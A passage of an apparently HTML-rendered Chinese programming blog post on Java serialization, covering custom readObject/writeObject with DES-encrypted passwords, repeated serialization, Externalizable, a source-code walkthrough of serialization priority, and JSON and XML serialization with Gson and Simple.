function_\">readObject</span><span class=\"params\">(ObjectInputStream in)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        ObjectInputStream.<span class=\"type\">GetField</span> <span class=\"variable\">getField</span> <span class=\"operator\">=</span> in.readFields();</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = (String) getField.get(<span class=\"string\">&quot;name&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = (Integer) getField.get(<span class=\"string\">&quot;age&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = DESUtils.decode((String) getField.get(<span class=\"string\">&quot;password&quot;</span>, <span class=\"literal\">null</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;原数据：&quot;</span> + whh);</span><br><span class=\"line\">        <span class=\"comment\">//Person&#123;name=&#x27;whh&#x27;, age=1, password=&#x27;uEWfz8iXsxIFXzvIO5347g==&#x27;&#125;</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化：&quot;</span> + load);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Person) objectInputStream.readObject();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码中writeObject中对password进行加密，之后在readObject中对其进行解密。<br>调用代码内的序列化和反序列化<code>ObjectOutputStream.writeSerialData</code>和<code>ObjectInputStream.readSerialData</code>。</p>\n<h4 id=\"多次序列化\"><a href=\"#多次序列化\" class=\"headerlink\" title=\"多次序列化\"></a>多次序列化</h4><p>在进行序列化的时候，可以多次写入对象。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, String password, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第一次序列化后文件大小：&quot;</span> + <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(filePath).length());<span class=\"comment\">//第一次序列化后文件大小：207</span></span><br><span class=\"line\">            objectOutputStream.flush();</span><br><span class=\"line\">            person.setName(<span class=\"string\">&quot;whhxz&quot;</span>);</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第二次次序列化后文件大小：&quot;</span> + <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(filePath).length());<span class=\"comment\">//第二次次序列化后文件大小：212</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> (Person) objectInputStream.readObject();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第一次序列化：&quot;</span> + person);<span class=\"comment\">//第一次序列化：Person&#123;name=&#x27;whh&#x27;, age=1, password=&#x27;password&#x27;&#125;</span></span><br><span class=\"line\">            <span class=\"type\">Person</span> <span class=\"variable\">person2</span> <span class=\"operator\">=</span> (Person)objectInputStream.readObject();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第二次序列化：&quot;</span> + person);</span><br><span class=\"line\">            System.out.println(person == person2);<span class=\"comment\">//true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上，第一次序列化后和第二次序列化后文件大小相差不大，而且两次反序列化后生成的对象是同一个。因为在序列化存储的时候，当写入文件的为同一个对象时，并不会再次将对象内容进行存储，只是再次存储一次引用（5字节），反序列化的时候恢复引用关系，所以第二次反序列化的时候和第一次的值为同一个。</p>\n<ul>\n<li>注：需要注意的是，在第一次序列化后修改了对象的值，重新序列化，但是在第二次反序列化的时候，该值并没有修改，也是因为第二次序列化的是第一次的引用，所有导致修改值后，反序列化后还是指向第一次的引用。</li>\n<li>注：在进行反序列化的时候，顺序应该和序列化时的顺序保持一致。</li>\n</ul>\n<h3 id=\"Externalizable序列化\"><a href=\"#Externalizable序列化\" class=\"headerlink\" title=\"Externalizable序列化\"></a>Externalizable序列化</h3><p>在对象序列化的时候，除了使用<code>Serializable</code>还有一个接口也可以用来标示序列化<code>Externalizable</code>。<code>Externalizable</code>继承<code>Serializable</code>，使用<code>Externalizable</code>后<code>Serializable</code>会失效。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Externalizable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, String password, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeExternal</span><span class=\"params\">(ObjectOutput out)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        out.writeObject(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">        out.writeInt(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">        out.writeObject(<span class=\"built_in\">this</span>.password);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readExternal</span><span class=\"params\">(ObjectInput in)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = (String) in.readObject();</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = in.readInt();</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = (String) in.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;序列化前对象&quot;</span> + whh);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;序列化后对象&quot;</span> + load);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">             <span class=\"keyword\">return</span> (Person) objectInputStream.readObject();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码通过实现<code>Externalizable</code>接口，在序列化和反序列化时会调用实现的方法用于对象的序列化。同理在序列化和反序列化中，可以修改序列化时对象的值来做定制化处理。</p>\n<p>注：在使用<code>Externalizable</code>时，必须有个无参的构造方法，不然在反序列化的时候会出错。</p>\n<h4 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h4><p>流程如下：<br>ObjectOutputStream.writeObject -&gt; writeObject0(判断类型做不同的序列化)-&gt;writeOrdinaryObject<br>在writeOrdinaryObject的时候，会先判断是否<code>Externalizable</code>且不是代理类，是走writeExternalData、否走writeSerialData。<br>writeExternalData为调用实现的接口中方法进行序列化。</p>\n<p>writeSerialData为先判断是否有writeObject方法，如果有调用反射调用该方法进行序列化，如果没有获取对象内字段进行序列化。<br>注意：<code>static</code>和<code>transient</code>标示的字段不会被获取，可参考<code>ObjectStreamClass.getDefaultSerialFields</code>其中就对字段进行了过滤。</p>\n<p>所以序列化优先级：<br>Externalizable &gt; writeObject &#x2F; readObject &gt; Serializable(默认)</p>\n<p>在使用前两个个进行序列化时，可以对<code>static</code>和<code>transient</code>进行定制的序列化。</p>\n<h3 id=\"第三方序列化框架\"><a href=\"#第三方序列化框架\" class=\"headerlink\" title=\"第三方序列化框架\"></a>第三方序列化框架</h3><p>在对对象进行序列化时，除了自带的序列化，还可以序列化为JSON、XML或者第三方格式。</p>\n<h4 id=\"JSON序列化\"><a href=\"#JSON序列化\" class=\"headerlink\" title=\"JSON序列化\"></a>JSON序列化</h4><p>在web端，js和后台服务交互时，通常会使用json序列化。常用的json序列化框架有：Gson、fastjson、Jackson等。通过Gson举例<br>maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.google.code.gson<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>gson<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.8.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, String password, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"type\">Gson</span> <span class=\"variable\">gson</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().create();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">json</span> <span class=\"operator\">=</span> save(whh);</span><br><span class=\"line\">        System.out.println(json);<span class=\"comment\">//&#123;&quot;age&quot;:1,&quot;password&quot;:&quot;password&quot;&#125;</span></span><br><span class=\"line\">        System.out.println(load(json));<span class=\"comment\">//Person&#123;name=&#x27;null&#x27;, age=1, password=&#x27;password&#x27;&#125;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">save</span><span class=\"params\">(Person person)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson.toJson(person);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String json)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson.fromJson(json, Person.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Gson简单使用如上。Gson还可以做到其他的定制化。详情查看(Gson教程)[<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9nc29uL2Jsb2IvbWFzdGVyL1VzZXJHdWlkZS5tZF0=\">https://github.com/google/gson/blob/master/UserGuide.md]<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h4 id=\"XML序列化\"><a href=\"#XML序列化\" class=\"headerlink\" title=\"XML序列化\"></a>XML序列化</h4><p>采用Simple2.0进行XML序列化。<br>maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.simpleframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>simple-xml<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.7.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Root</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> String name;</span><br><span class=\"line\">    <span class=\"meta\">@Element</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Element</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, String password, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span 